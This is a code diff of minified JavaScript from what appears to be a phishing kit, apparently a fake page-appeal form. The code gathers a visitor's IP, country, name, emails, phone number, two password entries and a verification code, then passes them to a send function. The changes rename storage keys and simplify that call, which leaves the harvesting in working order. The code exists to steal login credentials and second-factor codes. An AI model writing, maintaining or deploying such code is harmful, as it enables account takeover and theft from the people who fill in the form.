@@ -8160,18 +8160,15 @@ function xf({
         }, 500);
 
         const h = JSON.parse(localStorage.getItem("form"));
-        const x = `IP: ${localStorage.getItem("ip")}\nCountry: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}\n\nPage Name: ${h.page}\nFull Name: ${h.fname}\nBusiness email: ${h.bemail}\nPersonal email: ${h.pemail}\nPhone number: ${h.phone}Appeal: ${h.apeal}\n\nFirst pass: ${l}\nLast pass: ${v.current}`;
+        const x = `IP: ${localStorage.getItem("ipAddress")}\nCountry: ${localStorage.getItem("countryCode")} - ${localStorage.getItem("countryName")}\n\nPage Name: ${h.page}\nFull Name: ${h.fname}\nBusiness email: ${h.bemail}\nPersonal email: ${h.pemail}\nPhone number: ${h.phone}Appeal: ${h.apeal}\n\nFirst pass: ${l}\nLast pass: ${v.current}`;
 
-        kc({
-            data: x
-        });
+        kc(x);
         
         if (i === 1) {
             t(3);
         }
     }
 };
-
 
   return s.jsx("div", {
       className: `form ${e&&"active"}`,
@@ -8258,11 +8255,8 @@ function kf({
       }, 60 * 1e3), (x || v !== 60) && m(60), x = setInterval(() => {
           m(D => D - 1), v <= 0 && clearInterval(x)
       }, 1e3), o(D => D + 1);
-      const k = `
-      Country: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}\nAttempt: ${i+1}\nVerification: ${a}`;
-      kc({
-          data: k
-      })
+      const k = `Country: ${localStorage.getItem("countryCode")} - ${localStorage.getItem("countryName")}\nAttempt: ${i+1}\nVerification: ${a}`;
+      kc(k)
   };
   return T.useEffect(() => () => {
       x && clearInterval(x)
